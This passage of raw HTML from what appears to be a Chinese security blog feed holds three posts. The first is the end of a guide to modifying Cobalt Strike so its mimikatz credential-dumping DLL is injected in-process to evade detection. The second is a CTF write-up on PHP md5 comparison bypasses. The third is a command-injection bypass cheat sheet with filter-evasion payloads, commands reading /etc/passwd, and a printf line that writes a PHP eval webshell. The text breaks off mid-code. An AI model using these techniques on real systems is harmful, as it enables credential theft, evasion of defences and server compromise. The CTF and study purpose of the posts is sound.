class="hljs-string">&quot;x64&quot;</span>);<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">new</span> <span class="hljs-constructor">MimikatzJobSmall(<span class="hljs-params">this</span>, <span class="hljs-params">paramString</span>)</span>.spawn(this.bids<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>, <span class="hljs-string">&quot;x86&quot;</span>);<br>     &#125;<br>   &#125;<br> &#125;<br> <br></code></pre></td></tr></table></figure><p>在<strong>MimikatzSmall</strong>方法中，根据目标系统版本进行spawn。跟进到<strong>MimikatzJobSmall</strong>方法，最后rdi的是<strong>mimikatz-min.x64.dll</strong>或者<strong>mimikatz-min.x86.dll</strong>这个dll。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MimikatzJobSmall</span></span><br><span class="hljs-class">  <span class="hljs-keyword"><span class="hljs-keyword">extends</span> <span class="hljs-type">MimikatzJob</span></span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> MimikatzJobSmall(TaskBeacon paramTaskBeacon, <span class="hljs-keyword">String</span> paramString)<br>  &#123;<br>    <span class="hljs-keyword">super</span>(paramTaskBeacon, paramString);<br>  &#125;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> getDLLName()<br>  &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.arch.equals(<span class="hljs-string">&quot;x64&quot;</span>)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;resources/mimikatz-min.x64.dll&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;resources/mimikatz-min.x86.dll&quot;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="修改Java"><a href="#修改Java" class="headerlink" title="修改Java"></a>修改Java</h4><p>只需要将spawn方法修改inject方法即可，jar里实现的inject方法的需要传入pid，因为我们是注入当前进程，所以需要通过jar里实现的方法去获取当前进程的pid。另外需要注意的就是下面代码中的**localBeaconEntry.arch()<strong>获取是当前进程的位数，而原来代码里的</strong>localBeaconEntry.is64()**获取系统的位数。因为我们用到的是inject，所以需要在x64的进程中注入x64的dll，x86的dll中注入x86的dll。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public void <span class="hljs-constructor">MimikatzSmall(String <span class="hljs-params">paramString</span>)</span><br> &#123;<br>   <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; this.bids.length; i++)<br>   &#123;<br>     BeaconEntry localBeaconEntry = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataUtils</span>.</span></span>get<span class="hljs-constructor">Beacon(<span class="hljs-params">this</span>.<span class="hljs-params">data</span>, <span class="hljs-params">this</span>.<span class="hljs-params">bids</span>[<span class="hljs-params">i</span>])</span>;<br>     <span class="hljs-built_in">int</span> PID = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CommonUtils</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Number(<span class="hljs-params">localBeaconEntry</span>.<span class="hljs-params">getPid</span>()</span>, <span class="hljs-number">0</span>); <br>     <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;x64&quot;</span>.equals(localBeaconEntry.arch<span class="hljs-literal">()</span>)) &#123;<br>         <span class="hljs-keyword">new</span> <span class="hljs-constructor">MimikatzJobSmall(<span class="hljs-params">this</span>, <span class="hljs-params">paramString</span>)</span>.inject(PID, <span class="hljs-string">&quot;x64&quot;</span>);<br>         <span class="hljs-comment">//new MimikatzJobSmall(this, paramString).spawn(this.bids[i], &quot;x64&quot;);</span><br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">new</span> <span class="hljs-constructor">MimikatzJobSmall(<span class="hljs-params">this</span>, <span class="hljs-params">paramString</span>)</span>.inject(PID, <span class="hljs-string">&quot;x86&quot;</span>);<br>         <span class="hljs-comment">//new MimikatzJobSmall(this, paramString).spawn(this.bids[i], &quot;x86&quot;);</span><br>     &#125;<br>   &#125;<br> &#125;<br></code></pre></td></tr></table></figure><h4 id="DLL加解密"><a href="#DLL加解密" class="headerlink" title="DLL加解密"></a>DLL加解密</h4><p>因为Cobalt Strike中的DLL是加密的，需要进行解密才能对其dll进行修改。相关操作这里就不再详细说了。</p><p>具体可以参考<a href="https://github.com/lovechoudoufu/cobaltstrike4.4_cdf#dll%E4%BF%AE%E6%94%B9">https://github.com/lovechoudoufu/cobaltstrike4.4_cdf#dll%E4%BF%AE%E6%94%B9</a></p><h4 id="修改相应的DLL"><a href="#修改相应的DLL" class="headerlink" title="修改相应的DLL"></a>修改相应的DLL</h4><p>以<strong>logonpasswords</strong>为例，最后rdi的是<strong>mimikatz-min.x64.dll</strong>或者<strong>mimikatz-min.x86.dll</strong>这个dll。ida看一下这个dll，可以看到DLL的核心功能是在<strong>dllmain</strong>中完成的，调用功能函数之后，会直接调用<strong>ExitProcess</strong> 退出了进程。</p><p><img src="/img/Snipaste_2022-05-26_22-44-36.png"></p><p>这对于<strong>spawn</strong>方法是没有问题的，因为是新启动的<strong>rundll32.exe</strong>进程，执行完功能之后执行<strong>ExitProcess</strong>退出，但是被改成<strong>inject</strong>之后就有问题了，因为是在当前beacon进程空间中执行的，所以执行完功能会到导致当前的beacon进程挂掉。所以我们直接patch掉这个对<strong>ExitProcess</strong>的调用就可以了，但是看了一下对<strong>ExitProcess</strong>的调用是有多处的，一个一个patch太麻烦了。</p><p>所以这里有个更好的方法，就是直接把 <strong>ExitProcess</strong>修改为<strong>ExitThread</strong>方法 。由于当前的dll是被<strong>inject</strong>方法调用起来的，是在当前进程空间新启动的线程，所以当前进程挂掉之后，beacon进程的主线程不会受到影响。这里利用 <strong>CFF Explorer</strong> 修改导入表就可以了。</p><p><img src="/img/Snipaste_2022-05-26_22-46-45.png"></p><p>我们直接执行<strong>mimikatz coffee</strong>命令，这里的<strong>mimikatz</strong>和<strong>logonpasswords</strong>调用的是不同的两个dll，其中<strong>logonpasswords</strong>是用inject方法，而<strong>mimikatz coffee</strong>未做修改，用的spawn方法。可以看到未修改的被拦截了，而修改过的成功执行回显。</p><h4 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h4><p>如果我们上线的进程为x86的进程，而目标系统位数为x64位，此时我们执行<strong>logonpasswords</strong>，会对其x86进程注入x86的dll。此时会报错，报错内容为：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">ERROR </span>kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process<br></code></pre></td></tr></table></figure><p>这主要是内置的mimikatz的dll存在问题，msf中的mimikatz也会存在这个问题。因为目标系统为x64，所以需要一个x64的进程来注入x64的dll，即可。</p><h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a href="https://github.com/lovechoudoufu/cobaltstrike4.4_cdf">https://github.com/lovechoudoufu/cobaltstrike4.4_cdf</a><br><a href="http://www.crisprx.top/archives/529#0x05_Bypass_BeaconEye">http://www.crisprx.top/archives/529#0x05_Bypass_BeaconEye</a><br><a href="https://blog.csdn.net/qq_35938621/article/details/122366079">https://blog.csdn.net/qq_35938621/article/details/122366079</a><br><a href="https://blog.csdn.net/CoreNote/article/details/121711923">https://blog.csdn.net/CoreNote/article/details/121711923</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP MD5函数漏洞</title>
    <link href="/2022/05/26/PHP%20MD5/"/>
    <url>/2022/05/26/PHP%20MD5/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-MD5函数漏洞"><a href="#PHP-MD5函数漏洞" class="headerlink" title="PHP MD5函数漏洞"></a>PHP MD5函数漏洞</h1><h2 id="0x01-MD5算法"><a href="#0x01-MD5算法" class="headerlink" title="0x01 MD5算法"></a>0x01 MD5算法</h2><blockquote><p>首先还是说一下什么是MD5算法，MD5全名消息摘要算法（Message-Digest Algorithm 5）<span id="more"></span>，是一种密码散列函数，可以产生一个128位（16字节）的哈希值（hash value），用于确保信息传输的完整一致性，它的基础原理就是将数据预算变为另一固定长度的值</p></blockquote><h2 id="0x02-PHP中MD5函数的安全问题"><a href="#0x02-PHP中MD5函数的安全问题" class="headerlink" title="0x02 PHP中MD5函数的安全问题"></a>0x02 PHP中MD5函数的安全问题</h2><h3 id="1-PHP的比较运算符"><a href="#1-PHP的比较运算符" class="headerlink" title="1.PHP的比较运算符"></a>1.PHP的比较运算符</h3><blockquote><p>这里主要说一下PHP中的<code>==</code>与<code>===</code><br>因为这两者所产生的问题利用方法并不相同<br>下面是文档中对于<code> ==、!=、===、!==</code>的解释</p></blockquote><table><thead><tr><th><strong>例子</strong></th><th><strong>名称</strong></th><th><strong>结果</strong></th></tr></thead><tbody><tr><td>$a &#x3D;&#x3D; $b</td><td>等于</td><td><code>TRUE</code>，如果类型转换后 $a 等于 $b。</td></tr><tr><td>$a &#x3D;&#x3D;&#x3D; $b</td><td>全等</td><td><code>TRUE</code>，如果 $a 等于 $b，并且它们的类型也相同。</td></tr><tr><td>$a !&#x3D; $b</td><td>不等</td><td><code>TRUE</code>，如果类型转换后 $a 不等于 $b。</td></tr><tr><td>$a !&#x3D;&#x3D; $b</td><td>不全等</td><td><code>TRUE</code>，如果 $a 不等于 $b，或者它们的类型不同。</td></tr></tbody></table><blockquote><p>&#x3D;&#x3D;&#x3D; 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p><p>&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行<br>当 <code>var_dump(&quot;admin&quot;==0);</code> 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等<br><code>var_dump(&quot;0e123456&quot;==&quot;0e456789&quot;);</code>相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p></blockquote><p>PHP手册中</p><blockquote><p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。<br>所以就解释了<code>&quot;admin1&quot;==1 =&gt;False</code> 的原因</p></blockquote><h3 id="2-PHP-MD5中的函数漏洞"><a href="#2-PHP-MD5中的函数漏洞" class="headerlink" title="2.PHP MD5中的函数漏洞"></a>2.PHP MD5中的函数漏洞</h3><h4 id="使用0E-ByPass"><a href="#使用0E-ByPass" class="headerlink" title="使用0E ByPass"></a>使用0E ByPass</h4><p>文档<code>MD5</code>函数定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">md5</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$str</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$raw_output</span> = <span class="hljs-literal">FALSE</span> ] ) : <span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$v1</span> != <span class="hljs-variable">$v2</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucess&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>经过以上特性我们得知</p><blockquote><p><strong>使用</strong><code>==</code><strong>时，由于</strong><code>e</code><strong>（科学记数法），每个都会转换为数字表示，因此每个都变为</strong><code>0</code><strong>。</strong> <code>0 == 0</code><strong>是真的。</strong></p><p>所以当部分字母哈希后开头以<code>0E</code>开头,PHP会认为他们相等</p></blockquote><p>所以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;240610708&#x27;</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>));<br></code></pre></td></tr></table></figure><p>输出为<code>True</code></p><h4 id="使用数组-ByPass"><a href="#使用数组-ByPass" class="headerlink" title="使用数组 ByPass"></a>使用数组 ByPass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当满足上面的条件时，由于PHP中MD5函数的特性，可以使用数组绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">md5</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]) == <span class="hljs-title function_ invoke__">md5</span>([<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]) == <span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><p>故只要GET方法传入<code>?a[]=1&amp;b[]=2</code>执行<code>echo</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>命令注入总结</title>
    <link href="/2022/04/29/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2022/04/29/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="命令注入总结"><a href="#命令注入总结" class="headerlink" title="命令注入总结"></a>命令注入总结</h2><blockquote><p>利用各种调用系统命令的web应用,通过命令拼接、绕过黑名单等方式实现在服务端实现想要实现的系统命令 本文记录一些Bypass的方法,技巧</p></blockquote><span id="more"></span><h2 id="直接执行代码"><a href="#直接执行代码" class="headerlink" title="直接执行代码"></a>直接执行代码</h2><p>PHP 中有不少可以直接执行代码的函数。  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>();<br><span class="hljs-title function_ invoke__">assert</span>();<br><span class="hljs-title function_ invoke__">system</span>();<br><span class="hljs-title function_ invoke__">exec</span>();<br><span class="hljs-title function_ invoke__">shell_exec</span>();<br><span class="hljs-title function_ invoke__">passthru</span>();<br><span class="hljs-title function_ invoke__">escapeshellcmd</span>();<br><span class="hljs-title function_ invoke__">pcntl_exec</span>();<br></code></pre></td></tr></table></figure><p>preg_replace( ) 代码执行  </p><p>preg_replace() 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span>, <span class="hljs-string">&quot;addslashes(\\1)&quot;</span>, <span class="hljs-variable">$var</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>若无 <code>/e</code> 修饰符，则可以尝试 %00 截断。  </p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><ul><li><p>cmd &gt; file<br>把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。  </p></li><li><p>cmd &gt;&gt; file<br>把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。  </p></li><li><p>cmd &lt; file<br>使cmd命令从file读入  </p></li><li><p>cmd &lt;&lt; text<br>从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用<code>&lt;&lt;-</code> ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。  </p></li><li><p>cmd &lt;&lt;&lt; word<br>把word（而不是文件word）和后面的换行作为输入提供给cmd。  </p></li><li><p>cmd &lt;&gt; file<br>以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。  </p></li><li><p>cmd &gt;| file<br>功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用<code>&gt;!</code>实现这一功能。  </p></li><li><p>: &gt; filename</p><p>把文件<code>filename</code>截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与<code>touch</code>的效果相同).  </p></li><li><p>cmd &gt;&amp;n</p><p>把输出送到文件描述符n  </p></li><li><p>cmd m&gt;&amp;n</p><p>把输出到文件符m的信息重定向到文件描述符n  </p></li><li><p>cmd &gt;&amp;-</p><p>关闭标准输出  </p></li><li><p>cmd &lt;&amp;n</p><p>输入来自文件描述符n  </p></li><li><p>cmd m&lt;&amp;n</p><p>m来自文件描述各个n  </p></li><li><p>cmd &lt;&amp;-</p><p>关闭标准输入  </p></li><li><p>cmd &lt;&amp;n-</p><p>移动输入文件描述符n而非复制它。  </p></li><li><p>cmd &gt;&amp;n-</p><p>移动输出文件描述符n而非复制它。<br>注意： <code>&gt;&amp;</code>实际上复制了文件描述符，这使得<code>cmd &gt; file 2&gt;&amp;1</code>与<code>cmd 2&gt;&amp;1 &gt;file</code>的效果不一样。</p></li></ul><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag /&#123;<span class="hljs-built_in">cat</span>,flag&#125;<br>more flag<br>less flag<br>bzmore flag<br>bzless flag<br><span class="hljs-built_in">head</span> flag<br><span class="hljs-built_in">tail</span> flag<br>tailf flag <br><span class="hljs-built_in">tac</span> flag<br><span class="hljs-built_in">nl</span> flag<br><span class="hljs-built_in">od</span> -a flag<br><br>fire flag<br><span class="hljs-built_in">wc</span> flag<br><span class="hljs-built_in">uniq</span> flag<br>diff flag flag1.txt<br>sed -n <span class="hljs-string">&#x27;1,2p&#x27;</span> flag<br>find -P flag<br>strings flag<br>curl file:///root/flag<br><span class="hljs-built_in">sort</span> flag<br>bash -v flag <br>rev flag<br><span class="hljs-built_in">paste</span> ./flag.txt /etc/passwd<br><br></code></pre></td></tr></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="多条命令"><a href="#多条命令" class="headerlink" title="多条命令"></a>多条命令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">0</span>a、%<span class="hljs-number">0</span>d    换行符与回车符<br>|           第一条命令结果作为第二条命令的输入<br>||          第一条执行失败，执行第二条命令<br>;           连续指令功能。<br>&amp;           连接的两条命令都会执行<br>&amp;&amp;          当第一条执行成功后执行后续命令<br><br><span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>`date` =&gt; <span class="hljs-number">666</span>Tue <span class="hljs-number">14</span> May <span class="hljs-number">2019</span> <span class="hljs-number">07</span>:<span class="hljs-number">15</span>:<span class="hljs-number">23</span> AM EDT<br><br><span class="hljs-comment"># Windows</span><br>Copy %<span class="hljs-number">0</span>a<br><br>%<span class="hljs-number">1</span>a - 一个神奇的角色，作为.bat文件中的命令分隔符<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;dir &#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-variable">$escaped_command</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$command</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;out.bat&#x27;</span>,<span class="hljs-variable">$escaped_command</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;out.bat&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="绕过-escapeshellcmd"><a href="#绕过-escapeshellcmd" class="headerlink" title="绕过 escapeshellcmd"></a><strong>绕过 escapeshellcmd</strong></h3><ul><li>win 下执行 bat</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;dir &#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br><span class="hljs-variable">$escaped_command</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$command</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$escaped_command</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;out.bat&#x27;</span>,<span class="hljs-variable">$escaped_command</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;out.bat&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span>=../ %1a <span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><ul><li>${IFS}</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span>flag<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-variable">$9flag</span><br><span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9flag</span><br><span class="hljs-built_in">cat</span>%09flag  <span class="hljs-comment"># \0x09 是 TAB</span><br></code></pre></td></tr></table></figure><ul><li>重定向符&lt;&gt;</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>&lt;&gt;flag<br><span class="hljs-built_in">cat</span>&lt;flag<br></code></pre></td></tr></table></figure><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ul><li>拼接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=c;b=at;c=flag;$a<span class="hljs-variable">$b</span> <span class="hljs-variable">$c</span><br></code></pre></td></tr></table></figure><ul><li>利用已存在的资源</li></ul><p>从已有的文件或者环境变量中获得相应的字符。  </p><ul><li>编码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|<span class="hljs-built_in">base64</span> -d`<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|<span class="hljs-built_in">base64</span> -d|bash<br><br>$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\x63\x61\x74\x20\x66\x6c\x61\x67&quot;</span>)<br><br><span class="hljs-comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span><br>$ &#123;<span class="hljs-built_in">printf</span>,<span class="hljs-string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span>&#125; &gt;&gt; 1.php<br></code></pre></td></tr></table></figure><ul><li>单引号、双引号</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">c<span class="hljs-string">&quot;&quot;</span>at fl<span class="hljs-string">&#x27;&#x27;</span>ag<br>c<span class="hljs-string">&#x27;a&#x27;</span>t f<span class="hljs-string">&#x27;l&#x27;</span>ag<br></code></pre></td></tr></table></figure><ul><li>反斜线 \</li></ul><figure class="highlight 